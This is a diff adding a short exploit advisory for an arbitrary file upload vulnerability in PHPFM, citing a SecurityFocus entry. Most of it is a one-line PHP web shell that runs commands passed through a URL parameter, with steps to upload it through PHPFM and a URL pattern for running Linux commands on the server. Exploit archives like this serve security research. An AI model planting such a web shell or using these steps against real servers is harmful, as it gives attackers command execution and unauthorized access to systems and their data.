@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/15335/info
+
+PHPFM is prone to an arbitrary file upload vulnerability.
+
+An attacker can exploit this vulnerability to upload arbitrary code and execute it in the context of the Web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible. 
+
+---------------
+<pre>
+<?
+passthru($_GET['cmd']);
+?>>
+
+save as > cmd.php
+now upload in PHPFM
+
+
+http://www.esxample.com/[file upload name]/[files]/cmd.php?cmd=[command linux]
+
